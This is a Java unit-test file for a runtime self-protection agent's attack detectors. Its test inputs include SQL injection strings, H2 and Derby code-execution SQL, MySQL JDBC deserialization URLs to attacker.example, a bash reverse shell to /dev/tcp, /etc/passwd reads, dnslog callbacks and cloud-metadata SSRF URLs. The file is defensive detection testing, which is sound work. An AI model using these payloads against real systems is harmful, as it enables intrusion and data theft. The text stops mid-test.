package io.ohmyrasp.agent.detect;

import static io.ohmyrasp.agent.detect.DetectorTestSupport.assertAlgorithm;
import static io.ohmyrasp.agent.detect.DetectorTestSupport.jsonString;
import static io.ohmyrasp.agent.detect.DetectorTestSupport.request;
import static io.ohmyrasp.agent.detect.DetectorTestSupport.requestUri;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

import io.ohmyrasp.agent.http.ArchiveUploadPolicy;
import io.ohmyrasp.agent.model.Detection;
import io.ohmyrasp.agent.model.RequestContext;
import java.nio.charset.StandardCharsets;
import java.util.List;
import java.util.Map;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

/** Runtime detector facade tests. */
final class DetectorEngineTest {
  private final DetectorEngine engine = new DetectorEngine();

  @ParameterizedTest
  @ValueSource(strings = {"union/* report */select 2", "union -- report\nselect 2"})
  void recognizesRequestControlledUnion(String fragment) {
    assertAlgorithm(JdbcDetector.detectSql("select 1 " + fragment, request(Map.of("filter", List.of(fragment)))),
        "sql_userinput");
  }

  @ParameterizedTest
  @ValueSource(strings = {"select sleep/* diagnostics */(3)", "select 2 where id = 2 or/* predicate */1=1"})
  void recognizesSqlStructureAcrossTokenSeparators(String query) {
    assertAlgorithm(JdbcDetector.detectSql(query, RequestContext.empty()), "sql_policy");
  }

  @ParameterizedTest
  @ValueSource(strings = {
      "http://metadata.google.internal./", "http://[fd00:ec2:0:0:0:0:0:254]/",
      "http://100.100.100.200/", "http://[::ffff:169.254.169.254]/"
  })
  void recognizesMetadataDestination(String target) {
    assertAlgorithm(NetworkDestinationDetector.detectUrl(target, request()), "ssrf_aws");
  }

  @ParameterizedTest
  @ValueSource(strings = {
      "http://[::1]/asset", "http://[fd01::7]/asset", "http://[fe80::42]/asset",
      "http://[::ffff:192.168.1.2]/asset"
  })
  void recognizesInternalXmlAttachmentDestination(String target) {
    assertAlgorithm(NetworkDestinationDetector.detectXmlAttachmentReference("cxf-aegis-xop", target, request()), "ssrf_userinput");
  }

  @Test
  void recognizesFullyQualifiedCallbackDomain() {
    assertAlgorithm(NetworkDestinationDetector.detectDns("Test.Dnslog.Cn.", request()), "dns_blacklist");
  }

  @ParameterizedTest
  @ValueSource(strings = {"../reports/private.txt", "../../backup/users.zip"})
  void recognizesTraversalToOrdinaryFileTypes(String relative) {
    assertAlgorithm(FileAccessDetector.detectFileRead("/srv/public/" + relative,
        request(Map.of("path", List.of(relative))), false), "readFile_userinput");
  }

  @Test
  void recognizesRequestRelativeToProtectedWebappDirectory() {
    var ctx = request(Map.of("file", List.of("WEB-INF/web.xml")));
    assertAlgorithm(FileAccessDetector.detectFileRead("/app/WEB-INF/web.xml", ctx, false), "readFile_userinput");
  }

  @Test
  void keepsSqlEvidenceAfterDialectSpecificQuoting() {
    // MySQL backslash quoting and adjacent unary minus are both legal in JDBC statements.
    assertAlgorithm(JdbcDetector.detectSql("select 'O\\'Brien' union select 2",
        request(Map.of("filter", List.of("union select 2")))), "sql_userinput");
    assertAlgorithm(JdbcDetector.detectSql("select 4--2 union select 3",
        request(Map.of("filter", List.of("union select 3")))), "sql_userinput");
  }

  @Test
  void distinguishesConfiguredScopedAddressFromCopiedServiceUrl() {
    assertTrue(NetworkDestinationDetector.detectUrl("http://[fe80::42%25eth0]/health", request()).isEmpty());
    String service = "http://inventory_api/records";
    assertTrue(NetworkDestinationDetector.detectUrl(service, request(Map.of("url", List.of(service)))).isEmpty());
    assertAlgorithm(NetworkDestinationDetector.detectUrl(service, request(Map.of("url", List.of(service))), true), "ssrf_userinput");
  }

  @Test
  void comparesSuppliedUrlAuthorityAndPath() {
    var ctx = request(Map.of("endpoint", List.of("https://10.1.2.3:443/files")));
    assertAlgorithm(NetworkDestinationDetector.detectUrl("https://10.1.2.3/files/42", ctx), "ssrf_userinput");
    assertTrue(NetworkDestinationDetector.detectUrl("https://10.1.2.3/fileset/42", ctx).isEmpty());
    assertTrue(NetworkDestinationDetector.detectUrl("https://10.1.2.3:8443/files/42", ctx).isEmpty());
    assertTrue(NetworkDestinationDetector.detectUrl("https://media.example.test/files/42", ctx).isEmpty());
  }

  @Test
  void detectsSqlUserInput() {
    var result =
        JdbcDetector.detectSql(
            "select * from users where name = '' OR '1'='1'",
            request(Map.of("value", List.of("' OR '1'='1"))));

    assertTrue(result.isPresent());
    assertEquals("sql_userinput", result.orElseThrow().algorithm());
  }

  @Test
  void detectsSqlPolicyFeatures() {
    var result = JdbcDetector.detectSql("select sleep(3)", request());

    assertTrue(result.isPresent());
    assertEquals("sql_policy", result.orElseThrow().algorithm());
  }

  @Test
  void detectsSqlExceptionSignals() {
    var result =
        JdbcDetector.detectSqlException(
            "mysql",
            "1064",
            "",
            "You have an error in your SQL syntax",
            "select * from where",
            request());

    assertAlgorithm(result, "sql_exception");
  }

  @Test
  void detectsSqlRegex() {
    var result =
        JdbcDetector.detectSqlRegex(
            "select table_name from information_schema.tables", "information_schema", request());

    assertAlgorithm(result, "sql_regex");
  }

  @ParameterizedTest
  @ValueSource(strings = {
      "select 'SQLJ.INSTALL_JAR( reference'",
      "select 'RUNSCRIPT FROM https://docs.invalid/guide'",
      "/* CREATE ALIAS in the ProcessBuilder manual */ select 7",
      "CREATE ALIAS REPORT FOR 'java.lang.Math.abs'; select 'ProcessBuilder documentation'",
      "values 'LANGUAGE JAVA EXTERNAL NAME'"
  })
  void keepsSqlDocumentationSeparateFromExecutableClauses(String sql) {
    assertTrue(JdbcDetector.detectSql(sql, request()).isEmpty());
  }

  @Test
  void requiresTheSubmittedValueToSupplyAStatementBoundary() {
    String query = "select 'catalog'; select 2";
    assertTrue(JdbcDetector.detectSql(query, request(Map.of("term", List.of("catalog")))).isEmpty());
    assertAlgorithm(JdbcDetector.detectSql(query, request(Map.of("term", List.of("; select 2")))), "sql_userinput");
    assertTrue(JdbcDetector.detectSql("select '; select 2'", request(Map.of("term", List.of("; select 2")))).isEmpty());
  }

  @Test
  void detectsH2JavaAliasCodeExecution() {
    var result =
        JdbcDetector.detectSql(
            """
            CREATE ALIAS SHELL AS $$
            String shell(String cmd) throws java.io.IOException {
              java.lang.Runtime.getRuntime().exec(cmd);
              return cmd;
            }
            $$
            """,
            request());

    assertAlgorithm(result, "sql_h2_code_execution");
  }

  @Test
  void detectsH2RemoteRunScript() {
    var result = JdbcDetector.detectSql("RUNSCRIPT FROM 'http://example.com/evil.sql'", request());

    assertAlgorithm(result, "sql_h2_code_execution");
  }

  @Test
  void detectsStandaloneStructuralSqlInjectionWithoutRequestContext() {
    var tautology =
        JdbcDetector.detectSql(
            "SELECT * FROM users WHERE username = 'admin' OR 1=1'", RequestContext.empty());
    var comment =
        JdbcDetector.detectSql("SELECT * FROM users WHERE username = 'admin'--'", RequestContext.empty());
    var unquotedOr =
        JdbcDetector.detectSql("SELECT * FROM users WHERE id = 1 OR 1=1", RequestContext.empty());

    assertAlgorithm(tautology, "sql_policy");
    assertAlgorithm(comment, "sql_policy");
    assertAlgorithm(unquotedOr, "sql_policy");
  }

  @Test
  void ignoresBenignWhereOneEqualsOneBuilderPrefix() {
    var result =
        JdbcDetector.detectSql(
            "SELECT * FROM users WHERE 1=1 AND status = 'active'", RequestContext.empty());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsBase64Avx512TailUnderflowCandidatesAndRedactsPayload() {
    byte[] stdLen66 = ("A".repeat(64) + "A=").getBytes(StandardCharsets.ISO_8859_1);
    byte[] stdLen67 = ("A".repeat(64) + "AA=").getBytes(StandardCharsets.ISO_8859_1);
    byte[] stdLen130 = ("A".repeat(128) + "A=").getBytes(StandardCharsets.ISO_8859_1);
    byte[] urlLen66 = ("A".repeat(64) + "-=").getBytes(StandardCharsets.ISO_8859_1);
    byte[] sliceWithOffset = ("!!" + "B".repeat(64) + "B=" + "!!").getBytes(StandardCharsets.ISO_8859_1);

    var stdResult = Base64DecodeDetector.detectBase64Decode(stdLen66, 0, stdLen66.length, false, false, request());
    assertAlgorithm(stdResult, "base64_avx512_tail_underflow");
    assertEquals("base64", stdResult.orElseThrow().hook());
    assertEquals("66", stdResult.orElseThrow().details().get("length"));
    assertEquals("1", stdResult.orElseThrow().details().get("padding"));
    assertEquals("2", stdResult.orElseThrow().details().get("remainder"));
    assertEquals("standard", stdResult.orElseThrow().details().get("alphabet"));
    assertEquals("CVE-2026-114938", stdResult.orElseThrow().details().get("cve"));
    assertFalse(stdResult.orElseThrow().details().toString().contains("AAAA"));

    assertAlgorithm(
        Base64DecodeDetector.detectBase64Decode(stdLen67, 0, stdLen67.length, false, false, RequestContext.empty()),
        "base64_avx512_tail_underflow");
    assertAlgorithm(
        Base64DecodeDetector.detectBase64Decode(stdLen130, 0, stdLen130.length, false, false, RequestContext.empty()),
        "base64_avx512_tail_underflow");
    var urlResult =
        Base64DecodeDetector.detectBase64Decode(urlLen66, 0, urlLen66.length, true, false, RequestContext.empty());
    assertAlgorithm(urlResult, "base64_avx512_tail_underflow");
    assertEquals("URL-safe", urlResult.orElseThrow().details().get("alphabet"));

    assertAlgorithm(
        Base64DecodeDetector.detectBase64Decode(
            sliceWithOffset, 2, sliceWithOffset.length - 2, false, false, RequestContext.empty()),
        "base64_avx512_tail_underflow");
  }

  @Test
  void ignoresNonCandidateBase64Inputs() {
    byte[] validAligned = ("A".repeat(64) + "AA==").getBytes(StandardCharsets.ISO_8859_1);
    byte[] shortPadded = "YQ==".getBytes(StandardCharsets.ISO_8859_1);
    byte[] unpadded65 = "A".repeat(65).getBytes(StandardCharsets.ISO_8859_1);
    byte[] triplePad67 = ("A".repeat(64) + "===").getBytes(StandardCharsets.ISO_8859_1);
    byte[] excessPad65 = ("A".repeat(63) + "==").getBytes(StandardCharsets.ISO_8859_1);
    byte[] urlCharInStandard = ("A".repeat(64) + "-=").getBytes(StandardCharsets.ISO_8859_1);
    byte[] nonAlpha = ("A".repeat(63) + "!A=").getBytes(StandardCharsets.ISO_8859_1);
    byte[] cand = ("A".repeat(64) + "A=").getBytes(StandardCharsets.ISO_8859_1);

    assertTrue(Base64DecodeDetector.detectBase64Decode(validAligned, 0, validAligned.length, false, false, request()).isEmpty());
    assertTrue(Base64DecodeDetector.detectBase64Decode(shortPadded, 0, shortPadded.length, false, false, request()).isEmpty());
    assertTrue(Base64DecodeDetector.detectBase64Decode(unpadded65, 0, unpadded65.length, false, false, request()).isEmpty());
    assertTrue(Base64DecodeDetector.detectBase64Decode(triplePad67, 0, triplePad67.length, false, false, request()).isEmpty());
    assertTrue(Base64DecodeDetector.detectBase64Decode(excessPad65, 0, excessPad65.length, false, false, request()).isEmpty());
    assertTrue(Base64DecodeDetector.detectBase64Decode(urlCharInStandard, 0, urlCharInStandard.length, false, false, request()).isEmpty());
    assertTrue(Base64DecodeDetector.detectBase64Decode(nonAlpha, 0, nonAlpha.length, false, false, request()).isEmpty());
    assertTrue(Base64DecodeDetector.detectBase64Decode(cand, 0, cand.length, false, true, request()).isEmpty());
    assertTrue(Base64DecodeDetector.detectBase64Decode(null, 0, 66, false, false, request()).isEmpty());
    assertTrue(Base64DecodeDetector.detectBase64Decode(cand, -1, cand.length, false, false, request()).isEmpty());
    assertTrue(Base64DecodeDetector.detectBase64Decode(cand, 0, cand.length + 1, false, false, request()).isEmpty());
  }

  @Test
  void detectsDerbyJavaCodeLoadingSqlDuringRequest() {
    String query =
        """
        CALL SYSCS_UTIL.SYSCS_EXPORT_QUERY_LOBS_TO_EXTFILE('values cast(X''504b0304'' as blob)', '/tmp/payload', ',', '"', 'UTF-8', '/tmp/payload.jar')
        CALL SQLJ.INSTALL_JAR('/tmp/payload.jar', 'NACOS.PAYLOAD', 0)
        CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath', 'NACOS.PAYLOAD')
        CREATE FUNCTION S_EXAMPLE(PARAM VARCHAR(2000)) RETURNS VARCHAR(2000)
          PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME 'Exec.exec'
        """;

    var result = JdbcDetector.detectSql(query, request(Map.of("sql", List.of("SQLJ.INSTALL_JAR"))));

    assertAlgorithm(result, "sql_derby_code_execution");
  }

  @Test
  void detectsNacosCve202129442DerbyOpsJavaCodeLoadingSql() {
    String query =
        """
        CALL SYSCS_UTIL.SYSCS_EXPORT_QUERY_LOBS_TO_EXTFILE('values cast(X''504b0304'' as blob)', '/tmp/payload', ',', '"', 'UTF-8', '/tmp/payload.jar')
        CALL sqlj.install_jar('/tmp/payload.jar', 'NACOS.PAYLOAD', 0)
        CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath', 'NACOS.PAYLOAD')
        CREATE FUNCTION S_EXAMPLE(PARAM VARCHAR(2000)) RETURNS VARCHAR(2000)
          PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME 'Exec.exec'
        """;

    var result =
        JdbcDetector.detectSql(
            query,
            new RequestContext(
                "GET",
                "/nacos/v1/cs/ops/derby",
                "sql=" + query,
                Map.of("sql", List.of(query)),
                Map.of("user-agent", "JUnit")));

    assertAlgorithm(result, "sql_derby_code_execution");
    assertEquals("true", result.orElseThrow().details().get("requestControlled"));
  }

  @Test
  void ignoresDerbyJavaRoutineSqlOutsideRequest() {
    String query =
        "CREATE FUNCTION APP.ADD_ONE(PARAM INT) RETURNS INT "
            + "PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME 'com.example.Math.addOne'";

    assertTrue(JdbcDetector.detectSql(query, RequestContext.empty()).isEmpty());
  }

  @Test
  void ignoresOrdinaryH2Alias() {
    var result = JdbcDetector.detectSql("CREATE ALIAS UUID FOR \"java.util.UUID.randomUUID\"", request());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsH2JdbcInitCodeExecution() {
    var result =
        JdbcDetector.detectJdbcUrl(
            "jdbc:h2:mem:test;MODE=MSSQLServer;INIT=CREATE TRIGGER shell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript java.lang.Runtime.getRuntime().exec(\"id\") $$;AUTHZPWD=\\",
            request());

    assertAlgorithm(result, "jdbc_h2_init");
  }

  @Test
  void ignoresOrdinaryH2JdbcUrl() {
    var result = JdbcDetector.detectJdbcUrl("jdbc:h2:mem:test;DB_CLOSE_DELAY=-1", request());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsMysqlJdbcDeserializationUrl() {
    String url =
        "jdbc:mysql://attacker.example:3308/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor";

    var result = JdbcDetector.detectJdbcUrl(url, request(Map.of("url", List.of(url))));

    assertAlgorithm(result, "jdbc_mysql_deserialization");
  }

  @Test
  void detectsLinkisCve202244645MysqlDatasourceConnectParams() {
    String params =
        "{\"autoDeserialize\":\"true\",\"statementInterceptors\":\"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\",\"useSSL\":\"false\",\"maxAllowedPacket\":\"16777216\"}";
    String body =
        "{\"dataSourceName\":\"evil\",\"dataSourceTypeId\":1,\"createSystem\":\"Linkis\","
            + "\"connectParams\":{\"host\":\"attacker.example\",\"port\":\"3308\","
            + "\"username\":\"dd14fff\",\"password\":\"x\",\"params\":\""
            + jsonString(params)
            + "\"}}";
    String url =
        "jdbc:mysql://attacker.example:3308/?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&useSSL=false&maxAllowedPacket=16777216";

    var result =
        JdbcDetector.detectJdbcUrl(
            url,
            new RequestContext(
                "POST",
                "/api/rest_j/v1/data-source-manager/op/connect/json",
                "",
                Map.of(
                    "host",
                    List.of("attacker.example"),
                    "port",
                    List.of("3308"),
                    "params",
                    List.of(params)),
                Map.of("content-type", "application/json;charset=UTF-8", "user-agent", "JUnit"),
                body));

    assertAlgorithm(result, "jdbc_mysql_deserialization");
    assertEquals("mysql", result.orElseThrow().details().get("driver"));
  }

  @Test
  void detectsMariaDbJdbcDeserializationUrl() {
    String url =
        "jdbc:mariadb://attacker.example:3308/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor";

    var result = JdbcDetector.detectJdbcUrl(url, request(Map.of("jdbcUrl", List.of(url))));

    assertAlgorithm(result, "jdbc_mysql_deserialization");
  }

  @Test
  void ignoresMysqlJdbcDeserializationUrlWithoutRequestControl() {
    String url =
        "jdbc:mysql://attacker.example:3308/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor";

    var result = JdbcDetector.detectJdbcUrl(url, request());

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresRequestControlledOrdinaryMysqlJdbcUrl() {
    String url = "jdbc:mysql://db.example:3306/app?useSSL=false&connectTimeout=1000";

    var result = JdbcDetector.detectJdbcUrl(url, request(Map.of("url", List.of(url))));

    assertTrue(result.isEmpty());
  }

  @Test
  void checksOnlyTheSelectedWindowsInlineProgram() {
    String label = "O'Brien & Sons";
    var input = request(Map.of("label", List.of(label)));
    assertTrue(ProcessDetector.detectCommand(List.of("java.exe", "Report", label), input).isEmpty());
    assertTrue(ProcessDetector.detectCommand(List.of("powershell.exe", "-File", "report.ps1", label), input).isEmpty());
    assertTrue(ProcessDetector.detectCommand(List.of("pwsh", "-cwa", "Write-Output $args[0]", label), input).isEmpty());
    String program = "Write-Output weekly; Write-Output ready";
    assertTrue(ProcessDetector.detectCommand(List.of("pwsh", "-Command", program), request(Map.of("label", List.of("weekly")))).isEmpty());
    assertAlgorithm(ProcessDetector.detectCommand(List.of("pwsh", "-NoProfile", "-NonInteractive", "-Command", program),
        request(Map.of("program", List.of(program)))), "command_userinput");
    String afterComment = "<# report | template #> Write-Output weekly; Write-Output ready";
    assertAlgorithm(ProcessDetector.detectCommand(List.of("pwsh", "-c", afterComment),
        request(Map.of("program", List.of("weekly; Write-Output")))), "command_userinput");
    assertTrue(ProcessDetector.detectCommand(List.of("pwsh", "-c", afterComment),
        request(Map.of("description", List.of("report | template")))).isEmpty());
    assertAlgorithm(ProcessDetector.detectCommand(List.of("pwsh", "-Command", "Write-Output item#tag; Write-Output ready"),
        request(Map.of("program", List.of("tag; Write-Output")))), "command_userinput");
    String literal = "Write-Output 'Sales & Reports'";
    assertTrue(ProcessDetector.detectCommand(List.of("pwsh", "-Command", literal), request(Map.of("label", List.of(literal)))).isEmpty());
    assertTrue(ProcessDetector.detectCommand(List.of("cmd", "/d", "/c", "echo", "Sales & Reports"),
        request(Map.of("label", List.of("Sales & Reports")))).isEmpty());
  }

  @Test
  void detectsCommandUserInput() {
    var result =
        ProcessDetector.detectCommand(
            List.of("sh", "-c", "echo ok; cat /etc/passwd"),
            request(Map.of("cmd", List.of("cat /etc/passwd"))));

    assertTrue(result.isPresent());
    assertEquals("command_userinput", result.orElseThrow().algorithm());
  }

  @Test
  void separatesShellSourceFromProcessArguments() {
    var input = request(Map.of("text", List.of("sales|sh", "O'Brien")));
    assertTrue(ProcessDetector.detectCommand(List.of("printf", "%s", "sales|sh"), input).isEmpty());
    assertTrue(ProcessDetector.detectCommand(List.of("sh", "-c", "printf '%s' \"$1\"", "--", "O'Brien"), input).isEmpty());
    assertTrue(ProcessDetector.detectCommand(List.of("sh", "-c", "printf '%s' 'sales|sh'; printf done"), input).isEmpty());
    assertTrue(ProcessDetector.detectCommand(List.of("sh", "-c", "printf ok | cat"), request()).isEmpty());
    assertAlgorithm(ProcessDetector.detectCommand(List.of("/usr/bin/env", "LC_ALL=C", "/bin/sh", "-lc",
        "printf ok; date"), request(Map.of("job", List.of("date")))), "command_userinput");
  }

  @Test
  void checksFileReaderOperandsAtLaunch() {
    assertAlgorithm(ProcessDetector.detectCommand(List.of("/bin/cat", "--", "/etc/passwd"), request()), "command_common");
    assertTrue(ProcessDetector.detectCommand(List.of("cat", "/etc/passwd.example"), request()).isEmpty());
    assertTrue(ProcessDetector.detectCommand(List.of("cat", "--help", "/etc/passwd"), request()).isEmpty());
    assertAlgorithm(ProcessDetector.detectCommand(List.of("/usr/bin/env", "LC_ALL=C", "sh", "-c", "cat /etc/passwd"),
        request()), "command_common");
  }

  @Test
  void literalOutputDoesNotExemptOtherShellOperations() {
    for (String program : List.of("printf '%s' weekly\ncat /etc/passwd", "REPORT=/bin/echo cat /etc/passwd",
        "printf %s weekly; cat /etc/passwd", "eval 'cat /etc/passwd' # report")) {
      assertAlgorithm(ProcessDetector.detectCommand(List.of("sh", "-c", program), request()), "command_common");
    }
    for (String program : List.of("echo 'guide: cat /etc/passwd'", "printf 'percent %% [%8.3s]' 'cat /etc/passwd'")) {
      assertTrue(ProcessDetector.detectCommand(List.of("sh", "-c", program), request()).isEmpty(), program);
    }
    assertAlgorithm(ProcessDetector.detectCommand(List.of("sh", "-c", "/bin/cat -- '/etc/'passwd"), request()), "command_common");
  }

  @Test
  void detectsCommonDangerousCommand() {
    var result = ProcessDetector.detectCommand(List.of("bash", "-i", ">&", "/dev/tcp/127.0.0.1/4444"), request());

    assertTrue(result.isPresent());
    assertEquals("command_common", result.orElseThrow().algorithm());
  }

  @Test
  void detectsReflectiveCommandStack() {
    var args = List.of("id");
    var direct = List.of("java.lang.ProcessImpl", "java.lang.ProcessBuilder", "java.lang.reflect.Method");
    assertTrue(ProcessDetector.detectCommand(args, request(), direct).isEmpty());
    assertTrue(ProcessDetector.detectCommand(args, request(), direct, true).orElseThrow().requiresExplicitRule());
    var caller = List.of("java.lang.ProcessImpl", "java.lang.ProcessBuilder", "example.Report",
        "java.lang.reflect.Method");
    assertTrue(ProcessDetector.detectCommand(args, request(), caller, true).isEmpty());
    var result =
        ProcessDetector.detectCommand(
            List.of("id"), request(), List.of("java.lang.reflect.Method", "example.Shell"), true);

    assertAlgorithm(result, "command_reflect");
  }

  @Test
  void detectsSpringExpressionCommandStack() {
    var result =
        ProcessDetector.detectCommand(
            List.of("id"),
            request(),
            List.of(
                "org.springframework.expression.spel.ast.MethodReference",
                "org.springframework.expression.spel.standard.SpelExpression"));

    assertAlgorithm(result, "spel_runtime");
  }

  @Test
  void detectsGroovyCommandStack() {
    var result =
        ProcessDetector.detectCommand(
            List.of("id"),
            request(),
            List.of("org.codehaus.groovy.runtime.ProcessGroovyMethods"));

    assertAlgorithm(result, "script_runtime");
  }

  @Test
  void detectsGremlinGroovyCommandStack() {
    var result =
        ProcessDetector.detectCommand(
            List.of("id"),
            request(),
            List.of("org.apache.tinkerpop.gremlin.groovy.jsr223.GremlinGroovyScriptEngine"));

    assertAlgorithm(result, "script_runtime");
  }

  @Test
  void unrelatedExecutableListenerCanRunAnOrdinaryReportCommand() {
    for (String owner : List.of("example.reports.RunExecutableListener", "example.Jobs$RunExecutableListener")) {
      assertTrue(ProcessDetector.detectCommand(List.of("/usr/bin/printf", "weekly"), request(), List.of(owner)).isEmpty());
    }
  }

  @Test
  void detectsSolrCve201712629ConfiguredExecutableListenerCommandStack() {
    var result =
        ProcessDetector.detectCommand(
            List.of("sh", "-c", "touch /tmp/success"),
            request(),
            List.of("org.apache.solr.core.RunExecutableListener"));

    assertAlgorithm(result, "command_config_listener");
    assertEquals(
        "org.apache.solr.core.RunExecutableListener",
        result.orElseThrow().details().get("listener"));
  }

  @Test
  void detectsRocketMqCve202333246RuntimeConfigCommandLauncherStack() {
    var result =
        ProcessDetector.detectCommand(
            List.of("sh", "-c", "touch /tmp/success"),
            RequestContext.empty(),
            List.of(
                "java.lang.Runtime",
                "org.apache.rocketmq.broker.filtersrv.FilterServerUtil",
                "org.apache.rocketmq.broker.filtersrv.FilterServerManager"));

    assertAlgorithm(result, "command_config_injection");
    assertEquals(
        "org.apache.rocketmq.broker.filtersrv.FilterServerManager",
        result.orElseThrow().details().get("launcher"));
  }

  @Test
  void detectsRhinoJavascriptCommandStack() {
    var result =
        ProcessDetector.detectCommand(
            List.of("sh", "-c", "id"),
            request(),
            List.of(
                "org.mozilla.javascript.NativeJavaMethod",
                "org.mozilla.javascript.Context"));

    assertAlgorithm(result, "javascript_runtime");
  }

  @Test
  void detectsTemplateCommandStack() {
    var result =
        ProcessDetector.detectCommand(
            List.of("id"),
            request(),
            List.of("freemarker.template.utility.Execute"));

    assertAlgorithm(result, "template_runtime");
  }

  @Test
  void ignoresPlainLowSignalCommandWithoutRuntimeStack() {
    var result = ProcessDetector.detectCommand(List.of("id"), request());

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresLowSignalTouchCommandWithoutExecutableListenerStack() {
    var result = ProcessDetector.detectCommand(List.of("sh", "-c", "touch /tmp/success"), request());

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresLowSignalTouchWithOrdinarySchedulerStack() {
    var result =
        ProcessDetector.detectCommand(
            List.of("sh", "-c", "touch /tmp/success"),
            RequestContext.empty(),
            List.of("java.util.concurrent.ScheduledThreadPoolExecutor"));

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsCommandSyntaxError() {
    var result = ProcessDetector.detectCommand(List.of("sh", "-c", "echo 'unterminated"), request());

    assertAlgorithm(result, "command_error");
  }

  @Test
  void detectsDnslogCommand() {
    for (var argv : List.of(
        List.of("curl", "http://abc.dnslog.cn/a"),
        List.of("curl", "-fsSL", "-o", "report", "--url", "https://ABC.DNSLOG.CN./a"),
        List.of("wget", "-O", "report", "https://reports.invalid", "abc.dnslog.cn/a"),
        List.of("ping", "abc.dnslog.cn."), List.of("nslookup", "abc.dnslog.cn"),
        List.of("dig", "abc.dnslog.cn"))) {
      var result = ProcessDetector.detectCommand(argv, request());
      assertAlgorithm(result, "command_dnslog");
      assertEquals("abc.dnslog.cn", result.orElseThrow().details().get("host"));
    }
  }

  @Test
  void ignoresCallbackTextOutsideDestinationOperands() {
    for (var argv : List.of(
        List.of("printf", "%s", "curl http://abc.dnslog.cn/a"),
        List.of("curl", "https://notdnslog.cn/"),
        List.of("curl", "https://abc.dnslog.cn.example.test/"),
        List.of("curl", "http://abc.dnslog.cn@reports.invalid/"),
        List.of("curl", "https://reports.invalid/?guide=dnslog.cn"),
        List.of("curl", "-d", "abc.dnslog.cn", "https://reports.invalid/"),
        List.of("wget", "-O", "abc.dnslog.cn", "https://reports.invalid/"),
        List.of("curl", "https://abc.dnslog.cn/", "--version"),
        List.of("dig", "-f", "abc.dnslog.cn"))) {
      assertTrue(ProcessDetector.detectCommand(argv, request()).isEmpty(), argv.toString());
    }
  }

  @Test
  void detectsSsrfAwsMetadata() {
    var result = NetworkDestinationDetector.detectUrl("http://169.254.169.254/latest/meta-data/", request());

    assertTrue(result.isPresent());
    assertEquals("ssrf_aws", result.orElseThrow().algorithm());
  }

  @Test
  void detectsSsrfUserInput() {
    var result =
        NetworkDestinationDetector.detectUrl(
            "http://127.0.0.1/admin",
            request(Map.of("url", List.of("http://127.0.0.1/admin"))));

    assertAlgorithm(result, "ssrf_userinput");
  }

  @Test
  void detectsGeoServerCve202140822TestWfsPostExternalSsrfRelay() {
    String target = "http://interal/geoserver/../";
    var context =
        new RequestContext(
            "POST",
            "/geoserver/TestWfsPost",
            "url=http%3A%2F%2Finteral%2Fgeoserver%2F..%2F&body=testtest",
            Map.of(
                "url",
                List.of(target),
                "body",
                List.of("testtest"),
                "username",
                List.of("admin"),
                "password",
                List.of("admin")),
            Map.of("user-agent", "JUnit", "host", "interal"));

    assertTrue(NetworkDestinationDetector.detectUrl(target, context).isEmpty());
    var result = NetworkDestinationDetector.detectUrl(target, context, true);

    assertAlgorithm(result, "ssrf_userinput");
    assertTrue(result.orElseThrow().requiresExplicitRule());
    assertEquals("interal", result.orElseThrow().details().get("host"));
    assertEquals(target, result.orElseThrow().details().get("url"));
  }

  @Test
  void detectsWebLogicUddiExplorerOperatorSsrfRelay() {
    String target =
        "http://172.19.0.2:6379/test%0D%0A%0D%0Aconfig%20set%20dir%20/etc/%0D%0Asave";
    var context =
        new RequestContext(
            "GET",
            "/uddiexplorer/SearchPublicRegistries.jsp",
            "rdoSearch=name&txtSearchname=sdf&selfor=Business+location&operator="
                + "http%3A%2F%2F172.19.0.2%3A6379%2Ftest%250D%250A%250D%250Aconfig%2520set%2520dir%2520%2Fetc%2F%250D%250Asave",
            Map.of(
                "rdoSearch",
                List.of("name"),
                "txtSearchname",
                List.of("sdf"),
                "selfor",
                List.of("Business location"),
                "operator",
                List.of(target)),
            Map.of("user-agent", "JUnit"));

    var result = NetworkDestinationDetector.detectUrl(target, context);

    assertAlgorithm(result, "ssrf_userinput");
    assertEquals("172.19.0.2", result.orElseThrow().details().get("host"));
    assertEquals(target, result.orElseThrow().details().get("url"));
  }

  @Test
  void ignoresPublicExternalUrlWithoutRequestControl() {
    var result = NetworkDestinationDetector.detectUrl("https://example.com/public.xml", request());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsSsrfProtocol() {
    var result = NetworkDestinationDetector.detectUrl("gopher://127.0.0.1:6379/_info", request());

    assertAlgorithm(result, "ssrf_protocol");
  }

  @Test
  void detectsCxfXopFileAttachmentReference() {
    var result = NetworkDestinationDetector.detectXmlAttachmentReference("cxf-aegis-xop", "file:///etc/hosts", request());

    assertAlgorithm(result, "ssrf_protocol");
    assertEquals("cxf-aegis-xop", result.orElseThrow().details().get("mechanism"));
  }

  @Test
  void detectsCxfXopCidWrappedFileAttachmentReference() {
    var result =
        NetworkDestinationDetector.detectXmlAttachmentReference("cxf-aegis-xop", "cid:file:///etc/hosts", request());

    assertAlgorithm(result, "ssrf_protocol");
  }

  @Test
  void detectsCxfXopInternalHttpAttachmentReference() {
    var result =
        NetworkDestinationDetector.detectXmlAttachmentReference("cxf-aegis-xop", "http://127.0.0.1/admin", request());

